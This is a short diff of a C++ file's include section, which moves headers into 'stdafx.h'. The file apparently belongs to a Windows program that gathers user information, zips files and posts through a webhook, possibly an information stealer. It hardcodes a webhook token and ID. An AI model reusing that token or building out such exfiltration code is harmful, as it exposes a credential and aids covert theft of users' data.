@@ -1,25 +1,12 @@
 #define _CRT_SECURE_NO_WARNINGS
-
-#include <iostream>
-#include <fstream>
-#include <algorithm>
-#include <string>
-#include <vector>
-#include <functional>
-
-#include <Windows.h>
-
-#undef min
-#undef max
-
-#pragma comment(lib, "Shlwapi.lib")
-
-#include "ffs/linear.h"
-#include "zip/zip.h"
+#include "stdafx.h"
 
 #include "utils.h"
 #include "webhook.h"
 #include "usrinfo.h"
+
+#include "ffs/linear.h"
+#include "zip/zip.h"
 
 #define WEBHOOK_TOKEN "bt1e__roeSBzyaROJ1YJhGQdtrJJ5IFEX9pgEStCBOYtCdLttyl2-fqWR31pv9PQkxfv"
 #define WEBHOOK_ID 1134572478090448896
